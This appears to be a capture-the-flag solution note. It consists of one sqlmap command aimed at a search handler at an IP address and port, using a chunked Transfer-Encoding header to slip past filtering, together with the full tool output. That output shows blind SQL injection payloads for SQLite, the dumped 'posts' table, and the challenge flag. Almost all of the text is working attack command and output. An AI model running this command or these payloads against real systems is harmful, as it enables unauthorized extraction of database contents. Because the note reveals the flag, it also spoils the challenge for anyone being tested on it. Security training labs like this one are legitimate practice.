'''
SQLMAP

sqlmap -u "http://83.136.251.235:38343/Controllers/Handlers/SearchHandler.php" --data="search=1" --headers="Transfer-Encoding: chunked" --random-agent --level=5 --risk=3 --dbms=SQLite --dump

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:12:31 /2024-02-04/

[14:12:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:12:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=1' AND 5213=5213-- agTA

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: search=1' AND 5777=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- wUhe
---
[14:12:31] [INFO] testing SQLite
[14:12:31] [INFO] confirming SQLite
[14:12:31] [INFO] actively fingerprinting SQLite
[14:12:31] [INFO] the back-end DBMS is SQLite
web application technology: Apache
back-end DBMS: SQLite
[14:12:31] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:12:31] [INFO] fetching number of tables for database 'SQLite_masterdb'
[14:12:31] [INFO] resumed: 1
[14:12:31] [INFO] resumed: posts
[14:12:31] [INFO] resumed: CREATE TABLE posts (\n  id INTEGER PRIMARY KEY,\n  gamename TEXT NOT NULL,\n  gamedesc TEXT NOT NULL,\n  image BLOB NOT NULL\n)
[14:12:31] [INFO] fetching entries for table 'posts'
[14:12:31] [INFO] fetching number of entries for table 'posts' in database 'SQLite_masterdb'
[14:12:31] [INFO] resumed: 6
[14:12:31] [INFO] resumed: A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise.
[14:12:31] [INFO] resumed: Pikachu
[14:12:31] [INFO] resumed: 1
[14:12:31] [INFO] resumed: 1.png
[14:12:31] [INFO] resumed: Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.
[14:12:31] [INFO] resumed: Pac-Man
[14:12:31] [INFO] resumed: 2
[14:12:31] [INFO] resumed: 2.png
[14:12:31] [INFO] resumed: He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.
[14:12:31] [INFO] resumed: Sonic
[14:12:31] [INFO] resumed: 3
[14:12:31] [INFO] resumed: 3.png
[14:12:31] [INFO] resumed: Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.
[14:12:31] [INFO] resumed: Super Mario
[14:12:31] [INFO] resumed: 4
[14:12:31] [INFO] resumed: 4.png
[14:12:31] [INFO] resumed: Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.
[14:12:31] [INFO] resumed: Donkey Kong
[14:12:31] [INFO] resumed: 5
[14:12:31] [INFO] resumed: 5.png
[14:12:31] [INFO] resumed: HTB{tr4nsf3r_3Nc0d1Ng_4t_1ts_f1n3st}
[14:12:31] [INFO] resumed: Flag
[14:12:31] [INFO] resumed: 6
[14:12:31] [INFO] resumed: 6.png
Database: <current>
Table: posts
[6 entries]
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
| id | image | gamedesc                                                                                                                                                           | gamename    |
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
| 1  | 1.png | A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise. | Pikachu     |
| 2  | 2.png | Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.                                | Pac-Man     |
| 3  | 3.png | He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.                                 | Sonic       |
| 4  | 4.png | Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.                                                                           | Super Mario |
| 5  | 5.png | Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.                                                        | Donkey Kong |
| 6  | 6.png | HTB{tr4nsf3r_3Nc0d1Ng_4t_1ts_f1n3st}                                                                                                                               | Flag        |
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+

[14:12:31] [INFO] table 'SQLite_masterdb.posts' dumped to CSV file '/root/.local/share/sqlmap/output/83.136.251.235/dump/SQLite_masterdb/posts.csv'
[14:12:31] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/83.136.251.235'
[14:12:31] [WARNING] your sqlmap version is outdated
'''
